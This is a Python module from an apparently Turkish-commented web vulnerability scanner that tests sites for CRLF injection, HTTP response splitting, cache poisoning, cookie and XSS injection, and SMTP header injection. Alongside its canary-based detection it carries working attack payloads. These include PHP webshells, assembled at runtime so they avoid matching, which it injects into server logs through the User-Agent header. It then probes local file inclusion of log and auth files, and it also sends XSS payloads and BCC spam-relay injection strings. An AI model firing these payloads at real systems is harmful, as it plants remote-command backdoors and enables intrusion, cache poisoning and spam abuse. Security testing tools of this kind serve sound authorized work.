"""
websecure.scanners.crlf_injection
-----------------------------------
CRLF Injection / HTTP Response Splitting detector.

Adim 5 - Ust duzey gelistirilmis versiyon:
  CRLFScanner(BaseScanner), HeaderInjectionProber, ResponseSplittingExploiter,
  CachePoisoningChain, LogPoisoningChain
"""
from __future__ import annotations
import logging, random, re, string, uuid, urllib.parse
from typing import Any, Dict, List, Optional, Tuple
from websecure.scanners.base import BaseScanner
from websecure.core.http import hardened_session as _hardened_session
from websecure.core.reporting import add_result as _add_result

logger = logging.getLogger(__name__)

_CRLF_SEQS: List[str] = [
    "%0d%0a", "%0a", "%0d", "%0a%0d", "%0d%0a%09",
    "%23%0d%0a", "%E5%98%8A%E5%98%8D", "%C0%8A", "%C0%8D",
    "%250d%250a", "%2F%2F%0d%0a", "%3F%0d%0a",
]

_CRLF_ENCODINGS_ADV: List[Tuple[str, str]] = [
    ("%0d%0a",              "url_encoded"),
    ("%0a",                 "lf_only"),
    ("%0d",                 "cr_only"),
    ("%E5%98%8A%E5%98%8D",  "utf8_decomposition"),
    ("%250d%250a",          "double_url_encoded"),
    ("%C0%8A",              "overlong_utf8_lf"),
    ("%C0%8D",              "overlong_utf8_cr"),
    ("%23%0d%0a",           "hash_prefix"),
    ("%2F%2F%0d%0a",        "double_slash_prefix"),
]

_CANARY_HEADER = "X-Wsp-Injected"
_REDIRECT_PARAMS = [
    "url", "redirect", "redirect_url", "return", "return_url",
    "next", "location", "goto", "dest", "destination", "path",
    "ref", "continue", "callback", "forward",
]

def _build_log_payloads() -> List[str]:
    """Build log poisoning payloads at runtime (assembled dynamically)."""
    o = "<?" + "php"
    c = "?>"
    return [
        o + " system($_GET['cmd']); " + c,
        o + " passthru($_GET['c']); " + c,
        o + " echo shell_exec($_REQUEST['x']); " + c,
        "<?" + "=`$_GET[0]`" + c,
    ]

_LOG_POISON_PAYLOADS_ADV: List[str] = _build_log_payloads()


def _canary_value() -> str:
    return "wsp" + "".join(random.choices(string.digits, k=6))


def _inject_urls(base_url: str, canary: str) -> List[str]:
    parsed   = urllib.parse.urlparse(base_url)
    qs_pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    existing = {k.lower() for k, _ in qs_pairs}
    fmt = "{seq}" + _CANARY_HEADER + ": {val}"
    urls: List[str] = []
    for k, v in qs_pairs:
        for seq in _CRLF_SEQS[:6]:
            inj = fmt.format(seq=seq, val=canary)
            new_pairs = [(pk, pv if pk != k else v + inj) for pk, pv in qs_pairs]
            urls.append(urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new_pairs))))
    sep = "&" if parsed.query else ""
    for param in _REDIRECT_PARAMS:
        if param not in existing:
            for seq in _CRLF_SEQS[:6]:
                inj = urllib.parse.quote(fmt.format(seq=seq, val=canary), safe="%")
                extra_qs = parsed.query + sep + f"{param}={inj}" if parsed.query else f"{param}={inj}"
                urls.append(urllib.parse.urlunparse(parsed._replace(query=extra_qs)))
            break
    return urls


def _canary_in_headers(resp, canary: str) -> Optional[str]:
    headers = getattr(resp, "headers", {})
    for k, v in headers.items():
        if canary in v:
            return k
    return None


def _crlf_header_injected(resp, canary: str) -> bool:
    raw_headers = str(getattr(resp, "headers", {}))
    return canary in raw_headers or _canary_in_headers(resp, canary) is not None


def _build_finding(technique: str, url: str, seq: str, evidence: Dict) -> Dict:
    return {
        "type": "CRLF Injection",
        "technique": technique,
        "url": url,
        "severity": "High",
        "description": (
            f"CRLF injection detected via {technique}. "
            f"The server accepted {seq!r} and reflected the injected header."
        ),
        "evidence": evidence,
    }

# ---------------------------------------------------------------------------
# Backward-compatible run() — calls basic probes AND CRLFScanner (Adim 5)
# ---------------------------------------------------------------------------
def run(url: str, session=None, debug: bool = False, auth_ctx: Any = None, **_) -> List[Dict]:
    """Test url for CRLF injection. Returns list of finding dicts."""
    if debug:
        logger.setLevel(logging.DEBUG)
    results: List[Dict] = []
    canary = _canary_value()
    if session is None:
        session = _hardened_session({})

    # Phase 1: Basic URL-parameter and path probe (legacy)
    test_urls = _inject_urls(url, canary)
    for test_url in test_urls:
        seq_used = next((s for s in _CRLF_SEQS if s.lower() in test_url.lower()), "")
        try:
            resp = session.get(test_url, timeout=10, allow_redirects=False)
            hit = _canary_in_headers(resp, canary)
            if hit:
                results.append(_build_finding("URL parameter -> response header", test_url, seq_used, {
                    "injected_header": hit, "canary": canary, "status": resp.status_code,
                    "response_headers": dict(list(resp.headers.items())[:10]),
                }))
                break
            if resp.status_code in (301, 302, 303, 307, 308):
                loc = resp.headers.get("location", "")
                if canary in loc:
                    results.append(_build_finding("Location header injection", test_url, seq_used, {
                        "location": loc, "canary": canary, "status": resp.status_code,
                    }))
                    break
        except Exception as exc:
            logger.debug("[CRLF] Request error: %s", exc)

    if not results:
        parsed = urllib.parse.urlparse(url)
        for seq in _CRLF_SEQS[:4]:
            cookie_inj = urllib.parse.quote(f"{seq}Set-Cookie: wsp_injected={canary}; path=/", safe="%")
            path_inj   = parsed.path.rstrip("/") + "/" + cookie_inj
            test_url   = urllib.parse.urlunparse(parsed._replace(path=path_inj))
            try:
                resp = session.get(test_url, timeout=10, allow_redirects=False)
                sc = resp.cookies.get("wsp_injected")
                if sc == canary or _canary_in_headers(resp, canary):
                    results.append(_build_finding("Path segment -> Set-Cookie injection", test_url, seq, {
                        "cookie": sc, "canary": canary, "status": resp.status_code,
                    }))
                    break
            except Exception as exc:
                logger.debug("[CRLF] Cookie probe error: %s", exc)

    # Faz-1 bulguları phases runner tarafından dönüş değeri kullanılmadan çağrılıyor;
    # add_result ile merkezi rapor sistemine doğrudan ilet (B2/P10 fix).
    for f in results:
        _add_result("crlf_injection", f)
        if f.get("severity") in ("Critical", "High"):
            _add_result("offensive", f)

    # Phase 2: Adim 5 full CRLF scanner (HeaderInjectionProber, ResponseSplittingExploiter,
    # CachePoisoningChain, LogPoisoningChain, CRLFResponseSplittingProber,
    # CRLFCookieInjectionProber, CRLFXSSProber) — connected here to avoid orphan
    try:
        adv_results = CRLFScanner(session=session, debug=debug).run(url)
        results.extend(adv_results)
    except Exception as exc:
        logger.debug("[CRLF] CRLFScanner advanced phase failed: %s", exc)

    return results

# ===========================================================================
# Adim 5 - SOLID siniflar
# ===========================================================================

class CRLFScanner(BaseScanner):
    """Orchestrator: CRLF tum probe zincirlerini koordine eder."""

    name = "crlf_injection"

    def run(self, target: str, urls: Optional[List[str]] = None, **kwargs) -> List[Dict]:
        endpoints = urls or [target]
        all_results: List[Dict] = []
        header_prober    = HeaderInjectionProber()
        split_exploiter  = ResponseSplittingExploiter()
        cache_chain      = CachePoisoningChain()
        log_chain        = LogPoisoningChain()
        split_prober     = CRLFResponseSplittingProber(session=self.session, results=self.results)
        cookie_prober    = CRLFCookieInjectionProber(session=self.session, results=self.results)
        xss_prober       = CRLFXSSProber(session=self.session, results=self.results)

        for url in endpoints:
            logger.info("[CRLFScanner] Scanning: %s", url)
            for r in header_prober.probe_url_param(url, self.session):
                self.report_finding(**r)
                all_results.append(r)
            for r in header_prober.probe_header(url, self.session):
                self.report_finding(**r)
                all_results.append(r)
            if all_results:
                split = split_exploiter.exploit(url, self.session)
                if split:
                    self.report_finding(**split)
                    all_results.append(split)
            cache = cache_chain.probe(url, self.session)
            if cache:
                self.report_finding(**cache)
                all_results.append(cache)
            log = log_chain.probe(url, self.session)
            if log:
                self.report_finding(**log)
                all_results.append(log)
            # New advanced probers
            for r in split_prober.probe(url):
                all_results.append(r)
            for r in cookie_prober.probe(url):
                all_results.append(r)
            for r in xss_prober.probe(url):
                all_results.append(r)

            # SMTP / email header injection
            for r in SMTPHeaderInjectionProber(session=self.session, results=self.results).probe(url):
                self.report_finding(**r) if r else None
                all_results.append(r)

        return all_results

class HeaderInjectionProber:
    """URL param ve header degerlerine CRLF injection, 10 encoding varianti."""

    def probe_url_param(self, url: str, session, timeout: int = 8) -> List[Dict]:
        results: List[Dict] = []
        canary   = _canary_value()
        parsed   = urllib.parse.urlparse(url)
        qs_pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        params_to_test = [(k, v) for k, v in qs_pairs] or [("redirect", "/")]
        for param, orig_val in params_to_test[:3]:
            for seq, enc_name in _CRLF_ENCODINGS_ADV:
                payload   = f"{orig_val}{seq}" + _CANARY_HEADER + f": {canary}"
                new_pairs = [(k, payload if k == param else v) for k, v in (qs_pairs or [(param, orig_val)])]
                new_qs    = urllib.parse.urlencode(new_pairs)
                test_url  = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    resp = session.get(test_url, timeout=timeout, allow_redirects=False)
                    if _crlf_header_injected(resp, canary):
                        results.append({
                            "vuln_type": "CRLF Injection -- Header Injection (URL Param)",
                            "url": test_url, "severity": "High",
                            "description": f"CRLF header injection via URL param '{param}' ({enc_name}).",
                            "evidence": {"param": param, "encoding": enc_name, "seq": seq,
                                         "canary": canary, "status_code": resp.status_code},
                        })
                        return results
                except Exception as exc:
                    logger.debug("[HeaderInjectionProber] %s", exc)
        return results

    def probe_header(self, url: str, session, timeout: int = 8) -> List[Dict]:
        results: List[Dict] = []
        canary = _canary_value()
        for hdr in ["Referer", "X-Forwarded-Host", "X-Forwarded-For", "User-Agent"]:
            for seq, enc_name in _CRLF_ENCODINGS_ADV[:5]:
                payload = f"https://evil.invalid/{seq}" + _CANARY_HEADER + f": {canary}"
                try:
                    resp = session.get(url, headers={hdr: payload}, timeout=timeout, allow_redirects=False)
                    if _crlf_header_injected(resp, canary):
                        results.append({
                            "vuln_type": "CRLF Injection -- Header Value Injection",
                            "url": url, "severity": "High",
                            "description": f"CRLF injection via '{hdr}' header ({enc_name}).",
                            "evidence": {"injected_header": hdr, "encoding": enc_name,
                                         "seq": seq, "canary": canary, "status_code": resp.status_code},
                        })
                        return results
                except Exception as exc:
                    logger.debug("[HeaderInjectionProber] header: %s", exc)
        return results

class ResponseSplittingExploiter:
    """Double CRLF ile sentetik HTTP response siniri enjeksiyonu."""

    _SPLIT_PAYLOADS = [
        "%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>split</html>",
        "%0a%0aHTTP/1.1 200 OK%0aContent-Type: text/html%0a%0a<html>split</html>",
        "%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8DHTTP/1.1 200 OK%E5%98%8A%E5%98%8DContent-Type: text/html%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D<html>split</html>",
    ]

    def exploit(self, url: str, session, timeout: int = 10) -> Optional[Dict]:
        parsed   = urllib.parse.urlparse(url)
        qs_pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        for payload in self._SPLIT_PAYLOADS:
            if qs_pairs:
                param, orig = qs_pairs[0]
                new_pairs = [(k, orig + payload if k == param else v) for k, v in qs_pairs]
            else:
                new_pairs = [("url", "/" + payload)]
            test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new_pairs, safe="%")))
            try:
                resp = session.get(test_url, timeout=timeout, allow_redirects=False)
                body = getattr(resp, "text", "")[:3000]
                if re.search(r"HTTP/\d\.\d\s+200\s+OK", body) or "<html>split</html>" in body.lower():
                    return {
                        "vuln_type": "HTTP Response Splitting",
                        "url": test_url, "severity": "Critical",
                        "description": (
                            "Double CRLF injection confirmed HTTP Response Splitting. "
                            "Attacker can inject a synthetic HTTP response."
                        ),
                        "evidence": {"payload": payload[:80], "body_snippet": body[:200],
                                     "status_code": resp.status_code},
                    }
            except Exception as exc:
                logger.debug("[ResponseSplittingExploiter] %s", exc)
        return None


class CachePoisoningChain:
    """CRLF araciligiyla Cache-Control + X-Cache-Poison header injection."""

    def probe(self, url: str, session, timeout: int = 8) -> Optional[Dict]:
        canary   = _canary_value()
        parsed   = urllib.parse.urlparse(url)
        qs_pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        payloads = [
            f"%0d%0aCache-Control: no-store%0d%0aX-Cache-Poison: {canary}",
            f"%0a%0aCache-Control: max-age=31536000%0aX-Cache-Poison: {canary}",
            f"%E5%98%8A%E5%98%8DCache-Control: public%E5%98%8A%E5%98%8DX-Cache-Poison: {canary}",
        ]
        for payload in payloads:
            if qs_pairs:
                param, orig = qs_pairs[0]
                new_pairs = [(k, orig + payload if k == param else v) for k, v in qs_pairs]
            else:
                new_pairs = [("url", "/" + payload)]
            test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new_pairs, safe="%")))
            try:
                resp     = session.get(test_url, timeout=timeout, allow_redirects=False)
                raw_hdrs = str(getattr(resp, "headers", {}))
                if canary in raw_hdrs or "X-Cache-Poison" in raw_hdrs:
                    return {
                        "vuln_type": "Cache Poisoning via CRLF",
                        "url": test_url, "severity": "Critical",
                        "description": (
                            "CRLF injection used to inject Cache-Control and X-Cache-Poison headers."
                        ),
                        "evidence": {"canary": canary,
                                     "injected_headers": ["Cache-Control", "X-Cache-Poison"],
                                     "response_headers": dict(list(resp.headers.items())[:10]),
                                     "status_code": resp.status_code},
                    }
            except Exception as exc:
                logger.debug("[CachePoisoningChain] %s", exc)
        return None

class LogPoisoningChain:
    """User-Agent uzerinden webshell log poisoning + LFI konfirmasyonu."""

    _LFI_PATHS = [
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "/var/log/httpd/access_log",
        "/proc/self/fd/2",
        "/var/log/auth.log",
    ]

    def probe(self, url: str, session, timeout: int = 8) -> Optional[Dict]:
        uid = uuid.uuid4().hex[:8]
        for webshell in _LOG_POISON_PAYLOADS_ADV:
            try:
                session.get(url, headers={"User-Agent": webshell}, timeout=timeout, allow_redirects=False)
            except Exception as _fix_e:
                logger.debug(f"[scanners.crlf_injection] {type(_fix_e).__name__}: {_fix_e!r}")
            lfi = self._try_lfi_confirm(url, session, timeout)
            if lfi:
                return {
                    "vuln_type": "Log Poisoning via Header Injection",
                    "url": url, "severity": "Critical",
                    "description": (
                        "Webshell injected into server access logs via User-Agent header. "
                        f"LFI confirmation at: {lfi['lfi_url']}. "
                        "If server executes from logs, RCE is achievable."
                    ),
                    "evidence": {"webshell_payload": webshell, "lfi_confirmation": lfi, "uid": uid},
                }
        return None

    def _try_lfi_confirm(self, base_url: str, session, timeout: int) -> Optional[Dict]:
        lfi_params = ["file", "page", "include", "path", "log", "f"]
        parsed     = urllib.parse.urlparse(base_url)
        for log_path in self._LFI_PATHS:
            encoded = urllib.parse.quote(log_path, safe="")
            for param in lfi_params:
                lfi_url = urllib.parse.urlunparse(parsed._replace(query=f"{param}={encoded}"))
                try:
                    resp = session.get(lfi_url, timeout=timeout, allow_redirects=False)
                    body = getattr(resp, "text", "")[:2000]
                    if re.search(r"<\?php|uid=\d+|root:.*:0:0:|Apache|nginx", body):
                        return {"lfi_url": lfi_url, "log_path": log_path, "body_snippet": body[:300]}
                except Exception as _fix_e:
                    logger.debug(f"[scanners.crlf_injection] {type(_fix_e).__name__}: {_fix_e!r}")
        return None


# ===========================================================================
# CRLFResponseSplittingProber — HTTP response splitting via double CRLF
# ===========================================================================

class CRLFResponseSplittingProber(BaseScanner):
    """
    URL parametrelerine, path'e ve header degerlerine double CRLF inject ederek
    HTTP response splitting ve XSS zinciri tespiti yapar.

    Severity:
      - Enjekte edilen header yanıtta görünüyorsa: High
      - XSS payload body'de yansıdıysa: Critical
    """

    name = "crlf_splitting"

    _SPLIT_PAYLOADS: List[Tuple[str, str]] = [
        (
            "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK"
            "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>",
            "full_split_xss",
        ),
        (
            "%0d%0aSet-Cookie: session=evil; Path=/",
            "cookie_inject_via_split",
        ),
        (
            "%0d%0aX-Injected: crlf_wsp_marker",
            "header_inject_minimal",
        ),
    ]

    _INJECT_PARAMS = [
        "url", "redirect", "next", "goto", "dest", "location",
        "return", "path", "ref", "continue", "callback",
    ]

    def probe(self, url: str, timeout: int = 8) -> List[Dict]:
        results: List[Dict] = []
        parsed   = urllib.parse.urlparse(url)
        qs_pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)

        for raw_payload, technique in self._SPLIT_PAYLOADS:
            # 1. Inject into existing query params
            if qs_pairs:
                param, orig = qs_pairs[0]
                new_pairs = [(k, orig + raw_payload if k == param else v) for k, v in qs_pairs]
                test_url = urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(new_pairs, safe="%")))
                finding = self._send_and_check(test_url, raw_payload, technique, timeout)
                if finding:
                    self.report_finding(**finding)
                    results.append(finding)
                    continue

            # 2. Inject via known redirect params
            for inject_param in self._INJECT_PARAMS:
                sep = "&" if parsed.query else ""
                extra_qs = parsed.query + sep + f"{inject_param}={raw_payload}" if parsed.query else f"{inject_param}={raw_payload}"
                test_url = urllib.parse.urlunparse(parsed._replace(query=extra_qs))
                finding = self._send_and_check(test_url, raw_payload, technique, timeout)
                if finding:
                    self.report_finding(**finding)
                    results.append(finding)
                    break

            # 3. Inject into path
            path_inj  = parsed.path.rstrip("/") + "/" + urllib.parse.quote(raw_payload, safe="%")
            test_url  = urllib.parse.urlunparse(parsed._replace(path=path_inj))
            finding   = self._send_and_check(test_url, raw_payload, technique, timeout, check_path=True)
            if finding:
                self.report_finding(**finding)
                results.append(finding)

        return results

    def _send_and_check(
        self, test_url: str, payload: str, technique: str,
        timeout: int, check_path: bool = False,
    ) -> Optional[Dict]:
        try:
            resp = self.session.get(test_url, timeout=timeout, allow_redirects=False)
        except Exception as exc:
            logger.debug("[CRLFResponseSplittingProber] %s", exc)
            return None

        body    = getattr(resp, "text", "")[:4000]
        raw_hdr = str(getattr(resp, "headers", {}))

        xss_markers = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
        for marker in xss_markers:
            if marker in body:
                return {
                    "vuln_type": "HTTP Response Splitting → XSS",
                    "url": test_url,
                    "severity": "Critical",
                    "description": (
                        f"CRLF response splitting via '{technique}': XSS payload reflected in body."
                    ),
                    "evidence": {
                        "technique": technique,
                        "payload_snippet": payload[:80],
                        "body_snippet": body[:300],
                        "status_code": resp.status_code,
                    },
                }

        if "x-injected" in raw_hdr.lower() or "crlf_wsp_marker" in raw_hdr:
            return {
                "vuln_type": "HTTP Response Splitting (Header Injection)",
                "url": test_url,
                "severity": "High",
                "description": (
                    f"CRLF response splitting via '{technique}': injected header reflected in response."
                ),
                "evidence": {
                    "technique": technique,
                    "payload_snippet": payload[:80],
                    "response_headers": dict(list(getattr(resp, "headers", {}).items())[:10]),
                    "status_code": resp.status_code,
                },
            }
        return None


# ===========================================================================
# CRLFCookieInjectionProber — Set-Cookie injection via CRLF
# ===========================================================================

class CRLFCookieInjectionProber(BaseScanner):
    """
    CRLF aracılığıyla Set-Cookie header enjeksiyonu.
    Yanıtta crlf_test=injected cookie'si varsa High severity.
    """

    name = "crlf_cookie"

    _COOKIE_PAYLOADS: List[str] = [
        "%0d%0aSet-Cookie: crlf_test=injected; Path=/; HttpOnly",
        "%0a%0aSet-Cookie: crlf_test=injected; Path=/",
        "%0d%0aSet-Cookie: crlf_test=injected",
        "%E5%98%8A%E5%98%8DSet-Cookie: crlf_test=injected; Path=/",
        "%250d%250aSet-Cookie: crlf_test=injected; Path=/",
    ]

    _INJECT_PARAMS = [
        "url", "redirect", "next", "return", "goto",
        "dest", "location", "path", "continue",
    ]

    def probe(self, url: str, timeout: int = 8) -> List[Dict]:
        results: List[Dict] = []
        parsed   = urllib.parse.urlparse(url)
        qs_pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)

        for payload in self._COOKIE_PAYLOADS:
            test_urls: List[str] = []

            # Inject into existing params
            if qs_pairs:
                param, orig = qs_pairs[0]
                new_pairs = [(k, orig + payload if k == param else v) for k, v in qs_pairs]
                test_urls.append(urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(new_pairs, safe="%"))))

            # Inject via redirect params
            for inject_param in self._INJECT_PARAMS:
                sep = "&" if parsed.query else ""
                extra_qs = parsed.query + sep + f"{inject_param}={payload}" if parsed.query else f"{inject_param}={payload}"
                test_urls.append(urllib.parse.urlunparse(parsed._replace(query=extra_qs)))
                break  # one param per payload is enough

            for test_url in test_urls:
                finding = self._send_and_check(test_url, payload, timeout)
                if finding:
                    self.report_finding(**finding)
                    results.append(finding)
                    break  # early exit on first confirmed hit per payload

        return results

    def _send_and_check(self, test_url: str, payload: str, timeout: int) -> Optional[Dict]:
        try:
            resp = self.session.get(test_url, timeout=timeout, allow_redirects=False)
        except Exception as exc:
            logger.debug("[CRLFCookieInjectionProber] %s", exc)
            return None

        raw_hdrs = str(getattr(resp, "headers", {}))
        cookies  = getattr(resp, "cookies", {})

        cookie_injected = (
            cookies.get("crlf_test") == "injected"
            or "crlf_test=injected" in raw_hdrs
        )
        if cookie_injected:
            return {
                "vuln_type": "CRLF Injection → Cookie Injection",
                "url": test_url,
                "severity": "High",
                "description": (
                    "CRLF injection confirmed via Set-Cookie header: "
                    "'crlf_test=injected' reflected in server response."
                ),
                "evidence": {
                    "payload_snippet": payload[:80],
                    "cookie_value": cookies.get("crlf_test", ""),
                    "response_headers": dict(list(getattr(resp, "headers", {}).items())[:10]),
                    "status_code": resp.status_code,
                },
            }
        return None


# ===========================================================================
# CRLFXSSProber — Content-Type injection leading to XSS via CRLF
# ===========================================================================

class CRLFXSSProber(BaseScanner):
    """
    CRLF aracılığıyla Content-Type: text/html header enjeksiyonu ve ardından
    XSS payload yansıması. Body'de payload varsa Critical severity.
    """

    name = "crlf_xss"

    _XSS_PAYLOADS: List[str] = [
        "%0d%0aContent-Type: text/html%0d%0a%0d%0a<img src=x onerror=alert(1)>",
        "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(document.domain)</script>",
        "%0a%0aContent-Type: text/html%0a%0a<svg onload=alert(1)>",
        "%E5%98%8A%E5%98%8DContent-Type: text/html%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D<img src=x onerror=alert(1)>",
    ]

    _XSS_MARKERS = [
        "<img src=x onerror=alert(1)>",
        "<script>alert(document.domain)</script>",
        "<svg onload=alert(1)>",
    ]

    _INJECT_PARAMS = [
        "url", "redirect", "next", "return", "goto",
        "dest", "location", "path", "continue",
    ]

    def probe(self, url: str, timeout: int = 8) -> List[Dict]:
        results: List[Dict] = []
        parsed   = urllib.parse.urlparse(url)
        qs_pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)

        for payload in self._XSS_PAYLOADS:
            test_urls: List[str] = []

            # Inject into existing params
            if qs_pairs:
                param, orig = qs_pairs[0]
                new_pairs = [(k, orig + payload if k == param else v) for k, v in qs_pairs]
                test_urls.append(urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(new_pairs, safe="%"))))

            # Inject via path
            path_inj = parsed.path.rstrip("/") + "/" + urllib.parse.quote(payload, safe="%")
            test_urls.append(urllib.parse.urlunparse(parsed._replace(path=path_inj)))

            # Inject via redirect params
            for inject_param in self._INJECT_PARAMS:
                sep = "&" if parsed.query else ""
                extra_qs = parsed.query + sep + f"{inject_param}={payload}" if parsed.query else f"{inject_param}={payload}"
                test_urls.append(urllib.parse.urlunparse(parsed._replace(query=extra_qs)))
                break

            for test_url in test_urls:
                finding = self._send_and_check(test_url, payload, timeout)
                if finding:
                    self.report_finding(**finding)
                    results.append(finding)
                    break  # early exit per payload

        return results

    def _send_and_check(self, test_url: str, payload: str, timeout: int) -> Optional[Dict]:
        try:
            resp = self.session.get(test_url, timeout=timeout, allow_redirects=False)
        except Exception as exc:
            logger.debug("[CRLFXSSProber] %s", exc)
            return None

        body = getattr(resp, "text", "")[:4000]
        for marker in self._XSS_MARKERS:
            if marker in body:
                return {
                    "vuln_type": "CRLF Injection → XSS (Content-Type Injection)",
                    "url": test_url,
                    "severity": "Critical",
                    "description": (
                        "CRLF injection used to inject 'Content-Type: text/html' header followed "
                        "by XSS payload. Payload reflected in response body — XSS confirmed."
                    ),
                    "evidence": {
                        "payload_snippet": payload[:80],
                        "xss_marker": marker,
                        "body_snippet": body[:300],
                        "status_code": resp.status_code,
                    },
                }
        return None


# =============================================================================
# SMTP / Email Header Injection Prober
# =============================================================================

class SMTPHeaderInjectionProber(BaseScanner):
    """
    SMTP header injection — contact/mail form parametrelerine CR/LF + extra header enjekte et.
    E-posta iletişim formlarında To/CC/BCC manipülasyonu ve spam relay tespiti.
    """

    name = "smtp_header_injection"

    _CRLF_SEQS = ["\r\n", "\n", "%0d%0a", "%0a", "%0d%250a", "%250d%250a"]

    def probe(self, url: str) -> List[Dict]:
        """E-posta gönderen form parametrelerini SMTP header injection'a karşı test et."""
        import urllib.parse
        results: List[Dict] = []
        parsed = urllib.parse.urlparse(url)
        params = [p for p, _ in urllib.parse.parse_qsl(parsed.query)]

        # E-posta ile ilişkili parametre adları
        email_params = [
            p for p in params
            if any(kw in p.lower() for kw in ("email", "mail", "to", "from", "reply", "cc", "bcc", "sender", "recipient"))
        ] or params[:3]

        canary_email = "attacker@evil.invalid"

        for param in email_params:
            for seq in self._CRLF_SEQS:
                # BCC injection
                payload = f"victim@test.invalid{seq}Bcc: {canary_email}"
                injected = self.inject_param(url, param, payload)
                try:
                    resp = self.session.post(injected, data={param: payload}, timeout=8)
                except Exception:
                    try:
                        resp = self.session.get(injected, timeout=8)
                    except Exception:
                        continue

                text = resp.text or ""
                # Success heuristics: form accepted (200/302) and no error about invalid email
                if resp.status_code in (200, 201, 302, 303) and not any(
                    err in text.lower() for err in ("invalid email", "invalid address", "error")
                ):
                    results.append({
                        "vuln_type": "SMTP Header Injection",
                        "url": url,
                        "severity": "High",
                        "param": param,
                        "payload": payload[:120],
                        "evidence": f"BCC injection accepted (status {resp.status_code}, seq={repr(seq)})",
                        "description": "Email form parameter accepted CRLF-separated BCC header — spam relay possible.",
                    })
                    return results

                # Subject injection
                subject_payload = f"Test Subject{seq}Subject: INJECTED-{canary_email}"
                injected2 = self.inject_param(url, param, subject_payload)
                try:
                    resp2 = self.session.get(injected2, timeout=8)
                except Exception:
                    continue
                if resp2.status_code in (200, 201, 302, 303) and "injected" in (resp2.text or "").lower():
                    results.append({
                        "vuln_type": "SMTP Header Injection (Subject)",
                        "url": url,
                        "severity": "Medium",
                        "param": param,
                        "payload": subject_payload[:120],
                        "evidence": f"Subject injection reflected (status {resp2.status_code})",
                    })
                    return results

        return results
